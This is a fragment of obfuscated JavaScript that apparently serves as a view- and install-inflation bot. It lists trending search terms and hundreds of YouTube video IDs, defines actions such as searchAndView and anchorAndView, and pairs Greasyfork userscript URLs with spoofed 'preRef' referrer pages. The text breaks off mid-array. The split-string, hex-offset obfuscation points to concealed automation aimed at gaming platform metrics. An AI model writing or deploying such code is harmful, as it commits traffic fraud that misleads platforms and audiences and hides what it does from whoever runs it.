searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x7 * -0x143 + -0xf4c + 0x182b * 0x1)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x5e * -0x17 + 0x1e75 + -0x15f9)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x25d5 + 0x465 + -0x65 * 0x6b);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    a0(0x12) + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    Y(0x21) + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    Y(0xa) + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    a0(0x14) + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    a0(0xe) + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    Y(0x10) + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + a0(0x1f) + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + a0(0xc) + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Z(0x1a, 'himP') + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + Y(0x1d) + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a0(0x16) + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + Y(0x2) + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
